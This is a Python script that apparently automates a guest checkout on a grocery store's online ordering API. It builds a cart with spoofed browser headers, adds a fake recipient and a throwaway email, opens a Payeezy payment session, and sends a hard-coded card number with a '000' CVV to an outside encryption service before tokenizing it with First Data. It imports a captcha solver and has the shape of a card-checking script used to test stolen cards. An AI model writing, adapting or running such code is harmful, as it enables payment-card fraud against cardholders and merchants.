import requests
import asyncio
import capsolver

web = requests.Session()

headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://shop.fooddepot.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://shop.fooddepot.com/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'x-app-environment': 'browser',
    'x-app-version': 'v4.5.5+f3814740',
}

json_data = [
    {
        'Reference': 'e4076f24-80fc-425a-a983-b22e0029e423',
        'ProductId': '79865562-5194-498e-b3cc-add900572055',
        'CartItemId': 'e683c9dc-7620-408b-896e-3998535271bc',
        'OrderedQuantity': 4,
        'Note': '',
        'CanSubstitute': True,
        'FrequencyWeeks': None,
        'RecurringOrderId': None,
        'ProductOptions': [],
        'ShippingAddress': None,
        'Instructions': None,
        'GiftMessage': None,
        'IsProductMissing': False,
        'Origin': None,
        'OriginId': '',
        'RequestedProductName': '',
        'IsWeighted': False,
        'PricePerUnit': 0,
        'PreferredSubstitutionIds': [],
    },
]

req1 = web.put('https://production-us-1.noq-servers.net/api/v1/application/carts/5fecca1c-d1d5-473f-aecb-b22e0029b0ac/update-items',headers=headers,json=json_data,)
cart_id = req1.json()["Result"]["Reference"]
cart_reference = req1.json()["Result"]["Reference"]
print(cart_id,cart_reference)

json_data = {
    'DeliveryDistance': 0,
    'DeliveryStreetAddress': '',
    'AllowUnattendedDelivery': False,
    'IsEligibleForFreeDelivery': False,
    'IsEligibleForFreePickup': False,
    'IsFulfillmentTaxed': False,
    'IsGuest': True,
    'IsOfflinePayment': False,
    'PaymentSourceId': None,
    'FulfillmentAreaId': 707,
    'ShippingAddress': None,
    'StoreId': 407,
    'TimeSlot': {
        'Start': '2024-11-27T18:00:00-05:00',
        'Id': cart_id,
    },
    'GiftMessage': None,
    'Version': 2,
    'IsTipLimited': False,
    'HasDeals': False,
    'Reference': cart_reference,
    'BagAllowance': 0,
    'Deposit': 0,
    'FulfillmentMethod': 'Pickup',
    'MaxSnapAmount': 0,
    'PayWithSnapAmount': 0,
    'Instructions': '',
    'PaymentType': None,
    'ContainsAlcohol': False,
    'ContainsTobacco': False,
    'IsOverMaxSpend': False,
    'LoyaltyMembershipNumber': '',
    'Recipient': None,
    'TaxIncluded': False,
    'TippingPercentage': 0,
}

req2 = web.put(f'https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_reference}',headers=headers,json=json_data,)


json_data = {
    'DeliveryDistance': 0,
    'DeliveryStreetAddress': '',
    'FulfillmentSubTotal': 4.95,
    'AllowUnattendedDelivery': False,
    'IsEligibleForFreeDelivery': False,
    'IsEligibleForFreePickup': False,
    'IsFulfillmentTaxed': False,
    'IsGuest': True,
    'IsOfflinePayment': False,
    'PaymentSourceId': None,
    'FulfillmentAreaId': 707,
    'ShippingAddress': None,
    'StoreId': 407,
    'TimeSlot': {
        'Start': '2024-11-27T18:00:00-05:00',
        'Id': '028ee7d6-beb8-446a-a8e3-ac0d00e453d5',
    },
    'GiftMessage': None,
    'Version': 3,
    'IsTipLimited': False,
    'VoucherTotal': 0,
    'HasDeals': False,
    'Reference': '5fecca1c-d1d5-473f-aecb-b22e0029b0ac',
    'BagAllowance': 0,
    'CostPlusAmount': 4.35,
    'Deposit': 0,
    'FulfillmentMethod': 'Pickup',
    'GrandTotal': 62.93,
    'MaxSnapAmount': 0,
    'PayWithSnapAmount': 0,
    'Instructions': '',
    'PaymentType': None,
    'ContainsAlcohol': False,
    'ContainsTobacco': False,
    'IsOverMaxSpend': False,
    'LoyaltyMembershipNumber': '',
    'OrderedSubTotal': 43.48,
    'PickingAllowanceVariationAmount': 8.7,
    'Recipient': {
        'CustomerId': 0,
        'FirstName': 'Sebastian',
        'LastName': 'Gutierrez',
        'Email': 'scarlatmario4@tiktok.tf',
        'Phone': '5059947000',
    },
    'TaxIncluded': False,
    'TaxTotal': 1.45,
    'FixedTaxTotal': 0,
    'TippingAmount': 0,
    'TippingPercentage': 0,
}

req3 = web.put(f'https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_reference}',headers=headers,json=json_data,)


json_data = {
    'DeliveryDistance': 0,
    'DeliveryStreetAddress': '',
    'FulfillmentSubTotal': 4.95,
    'AllowUnattendedDelivery': False,
    'IsEligibleForFreeDelivery': False,
    'IsEligibleForFreePickup': False,
    'IsFulfillmentTaxed': False,
    'IsGuest': True,
    'IsOfflinePayment': False,
    'PaymentSourceId': None,
    'FulfillmentAreaId': 707,
    'ShippingAddress': None,
    'StoreId': 407,
    'TimeSlot': {
        'Start': '2024-11-27T18:00:00-05:00',
        'Id': '028ee7d6-beb8-446a-a8e3-ac0d00e453d5',
    },
    'GiftMessage': None,
    'Version': 4,
    'IsTipLimited': False,
    'VoucherTotal': 0,
    'HasDeals': False,
    'Reference': '5fecca1c-d1d5-473f-aecb-b22e0029b0ac',
    'BagAllowance': 0,
    'CostPlusAmount': 4.35,
    'Deposit': 0,
    'FulfillmentMethod': 'Pickup',
    'GrandTotal': 62.93,
    'MaxSnapAmount': 0,
    'PayWithSnapAmount': 0,
    'Instructions': '',
    'PaymentType': 'CreditCard',
    'ContainsAlcohol': False,
    'ContainsTobacco': False,
    'IsOverMaxSpend': False,
    'LoyaltyMembershipNumber': '',
    'OrderedSubTotal': 43.48,
    'PickingAllowanceVariationAmount': 8.7,
    'Recipient': {
        'CustomerId': 638469,
        'FirstName': 'Sebastian',
        'LastName': 'Gutierrez',
        'Email': 'scarlatmario4@tiktok.tf',
        'Phone': '5059947000',
    },
    'TaxIncluded': False,
    'TaxTotal': 1.45,
    'FixedTaxTotal': 0,
    'TippingAmount': 0,
    'TippingPercentage': 0,
}

req4 = web.put(f'https://production-us-1.noq-servers.net/api/v1/application/carts/{cart_reference}',headers=headers,json=json_data,)

params = {
    'storeId': '407',
    'customerId': '638469',
    'cartReference': cart_reference,
    'bd': '1732206157862.2uymcl',
    'fp': 'zf8tabtfXIdxrBnaK9WP',
}

req5 = web.post('https://production-us-1.noq-servers.net/api/v1/application/customer/payeezy-payment-transaction-session',params=params,headers=headers,)
print(req5.json())
public_key = req5.json()["Result"]["PublicKey"]
print(public_key)

base_url = "https://ykz-apisites.sh-ykza-env.com"
endpoint = "/encrypt/payeezy"
url = base_url + endpoint

headers = {
    "apisites": "FREEXXXX1-SERVER-[0x10][0xf]"
}

payload = {
    "pk": public_key,
    "data": {"card":"4124510160388493","cvv":"000","exp":"0629","name":"Sebastian Gutierrez"}
}

response = web.post(url, headers=headers, json=payload)
encrypted_data = response.json()['response']

headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
    'Cache-Control': 'no-cache',
    'Client-Token': 'Bearer 52Fq8QcfiasNwRXjjxMtAlPOaIL9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://docs.paymentjs.firstdata.com',
    'Pragma': 'no-cache',
    'Referer': 'https://docs.paymentjs.firstdata.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

json_data = {
    'encryptedData': encrypted_data,
}

req6 = web.post('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers, json=json_data)
print(req6.json())